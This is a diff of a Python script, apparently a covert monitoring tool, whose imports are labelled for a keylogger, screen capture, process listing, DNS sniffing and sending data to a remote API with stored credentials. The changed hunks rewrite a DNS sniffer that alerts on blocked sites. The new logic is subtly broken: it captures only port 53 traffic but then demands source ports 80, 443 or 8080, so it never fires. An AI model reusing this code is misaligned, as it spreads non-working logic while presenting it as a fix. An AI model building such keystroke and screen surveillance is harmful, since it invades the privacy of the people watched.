@@ -1,16 +1,11 @@
 import keyboard  # For Keylogger
-from threading import Timer  # For Keylogger
 from getmac import get_mac_address as gma  # For Mac Address
 from PIL import ImageGrab  # For ScreenLogger
 import base64  # For ScreenLogger
 import requests  # For API
 import json  # For API
-import io  # For ScreenLogger
 import psutil as ps  # For process
-import time  # For API
-from scapy.layers.dns import DNSQR, DNS # For Sniffer
-from scapy.layers.inet import UDP   # For Sniffer
-from scapy.layers.inet6 import IPv6 # For Sniffer
+from scapy.layers.dns import DNS # For Sniffer
 from scapy.all import * # For Sniffer
 import credenciais as cr  # For API
 import threading    # For paralelism
@@ -155,30 +150,31 @@ def send_alert(log):
 class Sniffer(threading.Thread):
     def __init__(self):
         threading.Thread.__init__(self)
-        self.blocked_sites = self.read_blocked_sites()
+        self.blocked_sites = set(self.read_blocked_sites())
         self.logs = []
+        self.queries = set()
 
     def read_blocked_sites(self):
         with open('C:\keyLogger\sites.txt') as file:
-            return file.read().split(';')
+            return [line.strip() for line in file]
 
     def sniffer(self, pkt):
-        if DNS in pkt:
-            query = pkt[DNS].qd.qname.decode("utf-8") if pkt[DNS].qd != None else "?"
-            query = query.rstrip('.')
-            for row in self.blocked_sites:
-                if query in row:
+        if DNS in pkt and pkt.haslayer(Raw):
+            src_port = pkt.sport
+            if src_port in [80, 443, 8080]:
+                query = pkt[DNS].qd.qname.decode("utf-8") if pkt[DNS].qd is not None else "?"
+                query = query.rstrip('.')
+                if query in self.blocked_sites and query not in self.queries:
                     log = "Alerta gerado pelo seguinte DNS: " + query
                     self.logs.append(log)
                     if len(self.logs) > 100:
                         self.logs.pop(0)
                     send_alert(log)
+                    self.queries.add(query)
 
     def run(self):
         logging("Iniciou do sniffer!")
-        sniff(filter='udp port 53 or (src port 80 or src port 443 or src port 8080)', prn=self.sniffer, store=0, count=0)
-
-
+        sniff(filter='udp port 53', prn=self.sniffer, store=0, count=0)
 
 import keyboard
 
